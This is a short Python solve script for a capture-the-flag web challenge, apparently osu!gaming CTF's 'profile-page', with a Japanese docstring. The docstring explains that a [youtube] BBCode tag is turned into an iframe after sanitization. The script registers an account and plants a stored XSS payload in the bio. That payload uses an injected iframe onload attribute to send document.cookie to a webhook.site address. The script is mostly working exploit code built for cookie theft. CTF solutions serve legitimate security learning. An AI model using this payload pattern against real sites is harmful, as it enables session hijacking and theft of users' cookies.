"""
XSS with onload attribute of iframe.


`renderBio`関数は、`[youtube] <something> [/youtube]`とすることで`iframe`タグを生成する。

```js
const renderBio = (data) => {
    const html = renderBBCode(data);
    const sanitized = purify.sanitize(html);
    // do this after sanitization because otherwise iframe will be removed
    return sanitized.replaceAll(
        /\[youtube\](.+?)\[\/youtube\]/g,
        '<iframe sandbox="allow-scripts" width="640px" height="480px" src="https://www.youtube.com/embed/$1" frameborder="0" allowfullscreen></iframe>'
    );
};
```

`onload`を使ってXSSする。

`[youtube]" onload="location.href='https://webhook.site/#!/view/.../?flag='+document.cookie [/youtube]`
"""

import httpx

BASE_URL = "https://profile-page.web.osugaming.lol/"

client = httpx.Client(base_url=BASE_URL)

def register(username, password):
    response = client.post("/api/register", data={"username": username, "password": password})
    return response

def login(username, password):
    response = client.post("/api/login", data={"username": username, "password": password})
    return response

def update_bio(username, password, new_bio):
    # Login first to get the session and csrf token
    login_response = login(username, password)
    csrf_token = login_response.cookies.get('csrf')

    headers = {'csrf': csrf_token}
    response = client.post("/api/update", data={"bio": new_bio}, headers=headers)
    return response

def get_userprofile(username):
    response = client.get(f"/profile/{username}")
    return response

register_response = register("newuser", "password123")
login_response = login("newuser", "password123")
update_bio_response = update_bio("newuser", "password123", "[youtube]\" onload=\"location.href='https://webhook.site/#!/view/849857cc-8465-406b-8057-c1699c5f7589/?flag='+document.cookie [/youtube]")

get_userprofile_response = get_userprofile("newuser")
print(get_userprofile_response.text)
